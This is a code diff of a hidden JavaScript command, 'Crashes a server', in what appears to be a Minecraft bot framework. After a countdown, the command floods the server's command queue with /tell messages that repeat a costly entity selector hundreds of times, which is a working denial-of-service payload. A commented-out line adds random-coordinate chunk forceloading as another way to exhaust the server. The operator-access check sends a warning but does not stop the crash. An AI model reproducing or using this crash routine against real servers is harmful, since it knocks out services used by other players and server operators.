@@ -1,10 +1,10 @@
 const index=require("../../index.js");
-const cc=require("../commandblock.js");
+//.ccq.push(`/forceload add ${Math.floor(Math.random()*5000000)} ${Math.floor(Math.random()*5000000)}`)
 module.exports={
 	command:function(b,msg,sender,username,verify){
 		const args=msg.split(" ");
 		if(!verify && args.length>=2){
-			b.send("This command is not able to select a server, unless being run from console.")
+			b.send("This command is not able to select a server, unless being run from console.");
 			return;
 		}
 		let server;
@@ -14,29 +14,29 @@ module.exports={
 			server=0;
 		}
 		if(index.bots[server].o.partial_op || index.bots[server].o.deop){
-			b.send("Operator access is required to crash server "+server+".")
+			b.send("Operator access is required to crash server "+server+".");
 		}
 		let delay;
 		if(args[2]!=="silent"){
 			delay=3000;
 			setTimeout(()=>{
-				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3")
+				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3");
 				if(b.id!=server){
-					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3")
+					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3");
 				}
-			},0)
+			},0);
 			setTimeout(()=>{
-				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2")
+				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2");
 				if(b.id!=server){
-					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2")
+					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2");
 				}
-			},1000)
+			},1000);
 			setTimeout(()=>{
-				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1")
+				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1");
 				if(b.id!=server){
-					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1")
+					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1");
 				}
-			},2000)
+			},2000);
 		} else {
 			delay=500;
 		}
@@ -44,13 +44,13 @@ module.exports={
 			const array=new Array(700).fill("@e[distance =1..2147483647]").join("@e"); 
 			const array2=new Array(700).fill("@e").join("@e"); 
 			for(let i=0;i<=20;i++){
-				index.bots[server].ccq.push('/minecraft:tell @a '+array)
-				index.bots[server].ccq.push('/minecraft:tell @a '+array2)
+				index.bots[server].ccq.push("/minecraft:tell @a "+array);
+				index.bots[server].ccq.push("/minecraft:tell @a "+array2);
 			}
-		},delay)
+		},delay);
 	},
 	desc: "Crashes a server",
 	usage: " [server]",
 	hidden: true
-}
+};
 
